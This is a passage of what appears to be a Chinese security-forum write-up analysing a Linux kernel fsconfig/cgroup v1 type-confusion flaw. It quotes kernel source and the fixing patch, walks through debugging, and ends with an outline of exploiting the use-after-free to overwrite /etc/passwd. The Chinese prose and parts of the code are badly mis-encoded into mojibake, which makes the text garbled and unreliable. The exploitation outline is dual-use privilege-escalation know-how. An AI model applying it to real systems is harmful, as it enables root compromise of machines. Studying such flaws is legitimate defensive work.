Â  Â Â  Â Â Â case FSCONFIG_SET_PATH:
Â  Â Â  Â Â  Â Â  Â param.type = fs_value_is_filename;
Â  Â Â  Â Â  Â Â  Â param.name = getname_flags(_value, lookup_flags, NULL);
Â  Â Â  Â Â  Â Â  Â if (IS_ERR(param.name)) {
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = PTR_ERR(param.name);
Â  Â Â  Â Â  Â Â  Â Â  Â  goto out_key;
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â param.dirfd = aux;
Â  Â Â  Â Â  Â Â  Â param.size = strlen(param.name->name);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_FD:
Â  Â Â  Â Â  Â Â  Â param.type = fs_value_is_file;
Â  Â Â  Â Â  Â Â  Â ret = -EBADF;
Â  Â Â  Â Â  Â Â  Â param.file = fget(aux);
Â  Â Â  Â Â  Â Â  Â if (!param.file)
Â  Â Â  Â Â  Â Â  Â Â  Â  goto out_key;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â default:
Â  Â Â  Â Â  Â Â  Â break;
Â  Â  }

Â  Â  ret = mutex_lock_interruptible(&fc->uapi_mutex);
Â  Â  if (ret == 0) {
Â  Â Â  Â Â Â ret = vfs_fsconfig_locked(fc, cmd, Â¶m);
Â  Â Â  Â Â Â mutex_unlock(&fc->uapi_mutex);
Â  Â  }

Â  Â  /* Clean up the our record of any value that we obtained fromÂ  Â Â  Â Â  Â * userspace.Â Â Note that the value may have been stolen by the LSM orÂ  Â Â  Â Â  Â * filesystem, in which case the value pointer will have been cleared.Â  Â Â  Â Â  Â */
Â  Â  switch (cmd) {
Â  Â Â  Â Â Â case FSCONFIG_SET_STRING:
Â  Â Â  Â Â Â case FSCONFIG_SET_BINARY:
Â  Â Â  Â Â  Â Â  Â kfree(param.string);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_PATH:
Â  Â Â  Â Â Â case FSCONFIG_SET_PATH_EMPTY:
Â  Â Â  Â Â  Â Â  Â if (param.name)
Â  Â Â  Â Â  Â Â  Â Â  Â  putname(param.name);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case FSCONFIG_SET_FD:
Â  Â Â  Â Â  Â Â  Â if (param.file)
Â  Â Â  Â Â  Â Â  Â Â  Â  fput(param.file);
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â default:
Â  Â Â  Â Â  Â Â  Â break;
Â  Â  }
Â  Â  out_key:
Â  Â  kfree(param.key);
Â  Â  out_f:
Â  Â  fdput(f);
Â  Â  return ret;
}
```  
  
è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å…è®¸æŒ‚è½½è‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿè€Œä¸ç”¨ä¿®æ”¹å†…æ ¸ï¼Œå®ƒåœ¨è°ƒç”¨çš„è¿‡ç¨‹ä¸­å­˜åœ¨ç±»å‹æ··æ·†æ¼æ´ã€‚  
  
åœ¨é€‰é¡¹ 5 æœ‰ä¸ªå¯ä»¥é‡Šæ”¾æ–‡ä»¶çš„æ“ä½œÂ FSCONFIG_SET_FDï¼Œåœ¨è§£é‡Šå‚æ•°çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨åˆ°ä¸‹é¢çš„å‡½æ•°  
```
int vfs_parse_fs_param(struct fs_context *fc, struct fs_parameter *param)
{
Â  Â Â  Â Â Â int ret;

Â  Â Â  Â Â Â if (!param->key)
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalf(fc, "Unnamed parameter\n");

Â  Â Â  Â Â Â ret = vfs_parse_sb_flag(fc, param->key);
Â  Â Â  Â Â Â if (ret != -ENOPARAM)
Â  Â Â  Â Â  Â Â  Â Â  Â  return ret;

Â  Â Â  Â Â Â ret = security_fs_context_parse_param(fc, param);
Â  Â Â  Â Â Â if (ret != -ENOPARAM)
Â  Â Â  Â Â  Â Â  Â Â  Â  /* Param belongs to the LSM or is disallowed by the LSM; soÂ  Â Â  Â Â  Â Â  Â Â  Â Â Â * don't pass to the FS.Â  Â Â  Â Â  Â Â  Â Â  Â Â Â */
Â  Â Â  Â Â  Â Â  Â Â  Â  return ret;

Â  Â Â  Â Â Â if (fc->ops->parse_param) {
Â  Â Â  Â Â  Â Â  Â Â  Â  ret = fc->ops->parse_param(fc, param);//è¿™ä¸ªåœ°æ–¹è°ƒç”¨äº†cgroup1_parse_param
Â  Â Â  Â Â  Â Â  Â Â  Â  if (ret != -ENOPARAM)
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â return ret;
Â  Â Â  Â Â Â }

Â  Â Â  Â Â Â /* If the filesystem doesn't take any arguments, give it theÂ  Â Â  Â Â  Â * default handling of source.Â  Â Â  Â Â  Â */
Â  Â Â  Â Â Â if (strcmp(param->key, "source") == 0) {
Â  Â Â  Â Â  Â Â  Â Â  Â  if (param->type != fs_value_is_string)
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â return invalf(fc, "VFS: Non-string source");
Â  Â Â  Â Â  Â Â  Â Â  Â  if (fc->source)
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â return invalf(fc, "VFS: Multiple sources");
Â  Â Â  Â Â  Â Â  Â Â  Â  fc->source = param->string;
Â  Â Â  Â Â  Â Â  Â Â  Â  param->string = NULL;
Â  Â Â  Â Â  Â Â  Â Â  Â  return 0;
Â  Â Â  Â Â Â }

Â  Â Â  Â Â Â return invalf(fc, "%s: Unknown parameter '%s'",
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  fc->fs_type->name, param->key);
}

int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
Â  Â  struct cgroup_fs_context *ctx = cgroup_fc2context(fc);
Â  Â  struct cgroup_subsys *ss;
Â  Â  struct fs_parse_result result;
Â  Â  int opt, i;

Â  Â  opt = fs_parse(fc, cgroup1_fs_parameters, param, &result);
Â  Â  if (opt == -ENOPARAM) {
Â  Â Â  Â Â Â if (strcmp(param->key, "source") == 0) {
Â  Â Â  Â Â  Â Â  Â if (fc->source)
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalf(fc, "Multiple sources not supported");
Â  Â Â  Â Â  Â Â  Â fc->source = param->string;
Â  Â Â  Â Â  Â Â  Â param->string = NULL;
Â  Â Â  Â Â  Â Â  Â return 0;
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â for_each_subsys(ss, i) {
Â  Â Â  Â Â  Â Â  Â if (strcmp(param->key, ss->legacy_name))
Â  Â Â  Â Â  Â Â  Â Â  Â  continue;
Â  Â Â  Â Â  Â Â  Â if (!cgroup_ssid_enabled(i) || cgroup1_ssid_disabled(i))
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "Disabled controller '%s'",
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  param->key);
Â  Â Â  Â Â  Â Â  Â ctx->subsys_mask |= (1 << i);
Â  Â Â  Â Â  Â Â  Â return 0;
Â  Â Â  Â Â Â }
Â  Â Â  Â Â Â return invalfc(fc, "Unknown subsys name '%s'", param->key);
Â  Â  }
Â  Â  if (opt < 0)
Â  Â Â  Â Â Â return opt;

Â  Â  switch (opt) {
Â  Â Â  Â Â Â case Opt_none:
Â  Â Â  Â Â  Â Â  Â /* Explicitly have no subsystems */
Â  Â Â  Â Â  Â Â  Â ctx->none = true;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_all:
Â  Â Â  Â Â  Â Â  Â ctx->all_ss = true;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_noprefix:
Â  Â Â  Â Â  Â Â  Â ctx->flags |= CGRP_ROOT_NOPREFIX;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_clone_children:
Â  Â Â  Â Â  Â Â  Â ctx->cpuset_clone_children = true;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_cpuset_v2_mode:
Â  Â Â  Â Â  Â Â  Â ctx->flags |= CGRP_ROOT_CPUSET_V2_MODE;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_xattr:
Â  Â Â  Â Â  Â Â  Â ctx->flags |= CGRP_ROOT_XATTR;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_release_agent:
Â  Â Â  Â Â  Â Â  Â /* Specifying two release agents is forbidden */
Â  Â Â  Â Â  Â Â  Â if (ctx->release_agent)
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "release_agent respecified");
Â  Â Â  Â Â  Â Â  Â ctx->release_agent = param->string;
Â  Â Â  Â Â  Â Â  Â param->string = NULL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â Â  Â Â Â case Opt_name:
Â  Â Â  Â Â  Â Â  Â /* blocked by boot param? */
Â  Â Â  Â Â  Â Â  Â if (cgroup_no_v1_named)
Â  Â Â  Â Â  Â Â  Â Â  Â  return -ENOENT;
Â  Â Â  Â Â  Â Â  Â /* Can't specify an empty name */
Â  Â Â  Â Â  Â Â  Â if (!param->size)
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "Empty name");
Â  Â Â  Â Â  Â Â  Â if (param->size > MAX_CGROUP_ROOT_NAMELEN - 1)
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "Name too long");
Â  Â Â  Â Â  Â Â  Â /* Must match [\w.-]+ */
Â  Â Â  Â Â  Â Â  Â for (i = 0; i < param->size; i++) {
Â  Â Â  Â Â  Â Â  Â Â  Â  char c = param->string[i];
Â  Â Â  Â Â  Â Â  Â Â  Â  if (isalnum(c))
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â continue;
Â  Â Â  Â Â  Â Â  Â Â  Â  if ((c == '.') || (c == '-') || (c == '_'))
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â continue;
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "Invalid name");
Â  Â Â  Â Â  Â Â  Â }
Â  Â Â  Â Â  Â Â  Â /* Specifying two names is forbidden */
Â  Â Â  Â Â  Â Â  Â if (ctx->name)
Â  Â Â  Â Â  Â Â  Â Â  Â  return invalfc(fc, "name respecified");
Â  Â Â  Â Â  Â Â  Â ctx->name = param->string;
Â  Â Â  Â Â  Â Â  Â param->string = NULL;
Â  Â Â  Â Â  Â Â  Â break;
Â  Â  }
Â  Â  return 0;
}
```  
  
é€šè¿‡Â PATCHÂ æ–‡ä»¶å¯ä»¥çœ‹å‡ºæ¥ï¼ˆå®åˆ™å› ä¸ºèœå®åœ¨åˆ†æä¸æ¥ï¼‰  
```
diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c
index ee93b6e895874..527917c0b30be 100644
--- a/kernel/cgroup/cgroup-v1.c
+++ b/kernel/cgroup/cgroup-v1.c
@@ -912,6 +912,8 @@ int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)
Â  Â Â  Â Â  Â opt = fs_parse(fc, cgroup1_fs_parameters, param, &result);
Â  Â Â  Â Â  Â if (opt == -ENOPARAM) {
Â  Â Â  Â Â  Â Â  Â Â  Â Â Â if (strcmp(param->key, "source") == 0) {
+Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â if (param->type != fs_value_is_string)
+Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â Â return invalf(fc, "Non-string source");
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  if (fc->source)
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â return invalf(fc, "Multiple sources not supported");
Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â Â  Â  fc->source = param->string;
```  
  
å¦‚æœÂ keyÂ ä¸ºÂ sourceï¼Œé‚£ä¹ˆÂ param->typeÂ å¿…é¡»è¢«æŒ‡å®šä¸ºÂ stringÂ ç±»å‹è€Œä¸èƒ½æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œæ­¤æ—¶å› ä¸ºå¤–é¢çš„Â cmd=FSCONFIG_SET_FDï¼Œå› æ­¤è·å–äº†æ–‡ä»¶ç»“æ„åœ¨è”åˆä½“å½“ä¸­ã€‚  
```
struct fs_parameter {
Â  Â  const charÂ  Â Â  Â Â  Â Â  Â Â  Â  *key;Â  Â Â  Â Â  Â Â  Â Â  Â  /* Parameter name */
Â  Â  enum fs_value_typeÂ  Â Â  Â Â Â type:8;Â  Â Â  Â Â  Â Â  Â Â  Â  /* The type of value here */
Â  Â  union {
Â  Â Â  Â Â Â charÂ  Â Â  Â Â  Â Â  Â Â  Â  *string;
Â  Â Â  Â Â Â voidÂ  Â Â  Â Â  Â Â  Â Â  Â  *blob;
Â  Â Â  Â Â Â struct filenameÂ  Â Â  Â Â Â *name;
Â  Â Â  Â Â Â struct fileÂ  Â Â  Â Â Â *file;
Â  Â  };
Â  Â  size_tÂ  Â Â  Â Â Â size;
Â  Â  intÂ  Â Â  Â Â Â dirfd;
};
```  
  
åœ¨åˆ¤æ–­ä¸­å¯ä»¥çœ‹åˆ°è¿™æ ·ä¸€å¥ï¼š  
```
if (strcmp(param->key, "source") == 0) {
Â  Â  if (fc->source)
Â  Â Â  Â Â Â return invalf(fc, "Multiple sources not supported");
Â  Â  fc->source = param->string;
Â  Â  param->string = NULL;
Â  Â  return 0;
}
```  
  
æ­¤æ—¶å°†Â stringÂ ä¿å­˜åœ¨Â fc->sourceÂ å½“ä¸­ï¼Œå› ä¸ºå®ƒä»¬å…±ç”¨å†…å­˜ï¼Œæ‰€ä»¥è¿™é‡Œçš„Â stringÂ å®é™…ä¸Šæ˜¯Â struct fileÂ ç»“æ„ä½“æŒ‡é’ˆã€‚  
  
æœ€åè¦Â freeÂ æ‰è¿™ä¸ªÂ fs_contextÂ ç»“æ„æ—¶ï¼Œå°±æ„å¤–åœ°é€ æˆäº†è¿™é‡Œçš„æ–‡ä»¶ç»“æ„çš„Â uafï¼Œæœ€åè¿™ä¸ªç³»ç»Ÿè°ƒç”¨å®Œæˆä¼šè§¦å‘Â fscontext_releaseã€‚  
```
void put_fs_context(struct fs_context *fc)
{
Â  Â  struct super_block *sb;

Â  Â  if (fc->root) {
Â  Â Â  Â Â Â sb = fc->root->d_sb;
Â  Â Â  Â Â Â dput(fc->root);
Â  Â Â  Â Â Â fc->root = NULL;
Â  Â Â  Â Â Â deactivate_super(sb);
Â  Â  }

Â  Â  if (fc->need_free && fc->ops && fc->ops->free)
Â  Â Â  Â Â Â fc->ops->free(fc);

Â  Â  security_free_mnt_opts(&fc->security);
Â  Â  put_net(fc->net_ns);
Â  Â  put_user_ns(fc->user_ns);
Â  Â  put_cred(fc->cred);
Â  Â  put_fc_log(fc);
Â  Â  put_filesystem(fc->fs_type);
Â  Â  kfree(fc->source);//è¿™é‡Œæ„å¤–åœ° free æ‰äº†æ–‡ä»¶ç»“æ„
Â  Â  kfree(fc);
}
static int fscontext_release(struct inode *inode, struct file *file)
{
Â  Â  struct fs_context *fc = file->private_data;

Â  Â  if (fc) {
Â  Â Â  Â Â Â file->private_data = NULL;
Â  Â Â  Â Â Â put_fs_context(fc);
Â  Â  }
Â  Â  return 0;
}
```  
## ä»£ç è°ƒè¯•  
### è§¦å‘UAF  
  
ç¬¬ä¸€æ­¥æ‰“æ–­ç‚¹Â __do_sys_fsconfigï¼Œç„¶åè·Ÿåˆ°å›¾ç¤ºè¿™ä¸ªä½ç½®ï¼Œå¯ä»¥å‘ç°è·å–åˆ°äº†æ–‡ä»¶ç»“æ„äº†ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKia3kia1AqibC0n941g0TxLbWwB8m29hBJbErm28IoVicoN7JpmRiaYAGabw/640?wx_fmt=png&from=appmsg "")  
  
éšåè·Ÿåˆ°è¿™ä¸ªä½ç½®  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKh4yYO8Ky47C1tHFAFc2WxsPtZpEGyWtN4Eoib3ZFfNt2e9vUSnKadZQ/640?wx_fmt=png&from=appmsg "")  
  
è¿™é‡Œä¼šæœ‰è°ƒç”¨åˆšåˆšçš„Â cgroup1_parse_paramï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥ä¸‹æ–­ç‚¹Â continueÂ è¿‡å»ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9aCaSuFIZrs6DtFFghVnIDrx8XEsNf5oLVNEqOK16dp3EAKuvfsibmA/640?wx_fmt=png&from=appmsg "")  
  
å½“ç„¶è¿™é‡Œå¯ä»¥çœ‹åˆ°Â sourceÂ ç›´æ¥è¢«å–èµ°äº†ï¼Œä¿å­˜åˆ°äº†Â fcÂ ç»“æ„å½“ä¸­ã€‚  
  
éšåä¸‹æ–­åœ¨Â fscontext_releaseï¼Œç„¶åÂ continueÂ è¿‡å»ï¼Œèµ°åˆ°Â kfreeÂ è¿™å’Œä½ç½®å¯ä»¥å‘ç°Â sourceÂ è¢«é‡Šæ”¾ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9QGRG15RN0WXar0206ibxKlVXuQCKVYVwXZNDfKK8zF8luwBh4zHxaQ/640?wx_fmt=png&from=appmsg "")  
  
è¿™é‡Œä¹Ÿèƒ½çœ‹åˆ°ä½œè€…åŸæ„æ˜¯æƒ³åœ¨è¿™é‡Œé‡Šæ”¾Â sourceÂ å­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™é‡Œé‡Šæ”¾äº†Â fileÂ æ–‡ä»¶ç»“æ„æŒ‡é’ˆï¼Œè°ƒè¯•çš„æ—¶å€™å¯ä»¥å’Œä¹‹å‰å¯¹ä¸€ä¸‹ï¼Œå‘ç°åœ°å€æ˜¯ä¸€è‡´çš„ï¼Œå› æ­¤è¿™é‡Œé€ æˆäº† uafã€‚  
### å»¶é•¿ç«äº‰æ—¶é—´  
  
è¿™é‡Œé‡‡ç”¨Â writevÂ å†™å…¥å¤§é‡æ•°æ®ä½¿å¾—æ–‡ä»¶æ‹¿é”çš„æ—¶é—´åŠ é•¿ã€‚ä¸ºäº†è°ƒè¯•Â expï¼Œå¯ä»¥ç”¨Â add-symbol-fileÂ å‘½ä»¤å»æ·»åŠ ç¬¦å·ï¼Œè¿™é‡Œå¯ä»¥é€‰æ‹©æ–­Â write_cmdÂ çš„Â writevÂ å‡½æ•°ï¼Œå› ä¸ºè¿™é‡Œä¼šå› ä¸ºå†™å…¥æ•°æ®é‡è¿‡å¤§è€Œé•¿æœŸæŒæœ‰é”ï¼Œwritev å°±ä¼šå°è¯•æŒç»­è·å¾—é”ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKobv3ScTdumMGgVy7s004TcPC57owjahuSb5bG7uY9OQ3tqvBU0FM1w/640?wx_fmt=png&from=appmsg "")  
  
éšåç»è¿‡ç³»ç»Ÿè°ƒç”¨æ¥åˆ°Â do_writevÂ å‡½æ•°  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKGhLZqBlbsv8gLBZJTGdp1JrKLApHI4H2c23Md3icIup6P6UoreLbssw/640?wx_fmt=png&from=appmsg "")  
  
ä¸è¿‡è¿™é‡Œå¤šçº¿ç¨‹æ¯”è¾ƒéš¾è°ƒï¼Œä¹Ÿä¸æ”¾è°ƒè¯•å…·ä½“è¿‡ç¨‹äº†ï¼Œæ„Ÿè§‰åŸç†è¿˜æ˜¯æ¯”è¾ƒæµ…æ˜¾æ˜“æ‡‚çš„ã€‚  
## æ€»ç»“  
  
æˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºä»¥ä¸‹çš„åˆ©ç”¨æ€è·¯ï¼š  
- fsconfigÂ ç³»ç»Ÿè°ƒç”¨çš„ä»£ç å­˜åœ¨ç±»å‹æ··æ·†æ¼æ´ï¼Œé—´æ¥å¯¼è‡´äº†å¯ä»¥ä½¿å¾—æŸæ–‡ä»¶æè¿°ç¬¦ç»“æ„è¢«Â uaf  
  
- é€šè¿‡å†™å…¥å¤§é‡æ•°æ®å»¶é•¿ç«äº‰æ—¶é—´ï¼Œé€šè¿‡å»ºç«‹ä¸€ä¸ªé“¾æ¥çš„æ–¹å¼ç»•è¿‡Â openÂ æ—¶èµ‹äºˆçš„æ ‡è®°ä½ï¼Œä½¿å¾—ä¸¤ä¸ªçº¿ç¨‹å¯ä»¥å¡åœ¨æƒé™æ ¡éªŒä¹‹åã€‚  
  
- ç¬¬ä¸‰ä¸ªçº¿ç¨‹åœ¨ç¬¬äºŒä¸ªçº¿ç¨‹å¡ä½çš„æ—¶é—´ç”³è¯·Â /etc/passwdÂ æ–‡ä»¶çš„ç»“æ„ï¼Œæ›¿æ¢çº¿ç¨‹ 2 æ­£åœ¨å†™å…¥çš„æ–‡ä»¶ï¼Œå®Œæˆæ¼æ´åˆ©ç”¨ã€‚  
  
åˆ†æçš„è¿˜æœ‰å¾ˆå¤šä¸è¶³ä¹‹å¤„ï¼Œå¦‚æœæœ‰è®²çš„ä¸å¥½çš„åœ°æ–¹æ³è¯·å¸ˆå‚…å¤šå¤šåŒ…æ¶µå¹¶å¸®åŠ©æŒ‡æ­£ã€‚  
  
**-å®˜æ–¹è®ºå›**  
  
www.52pojie.cn  
  
  
  
**ğŸ‘†ğŸ‘†ğŸ‘†**  
****  
  
å…¬ä¼—å·  
**è®¾ç½®â€œæ˜Ÿæ ‡â€ï¼Œ**æ‚¨  
**ä¸ä¼šé”™è¿‡**  
æ–°çš„æ¶ˆæ¯é€šçŸ¥  
  
å¦‚**å¼€æ”¾æ³¨å†Œã€ç²¾åæ–‡ç« å’Œå‘¨è¾¹æ´»åŠ¨**  
ç­‰å…¬å‘Š  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/LFPriaSjBUZK0l7v6mmrudZKXzpdM1WcomgJQnibvLzBUFRSurSkmIfl0ZrDNvSy3MszKNY3XOkcuUbWp31HMjLQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
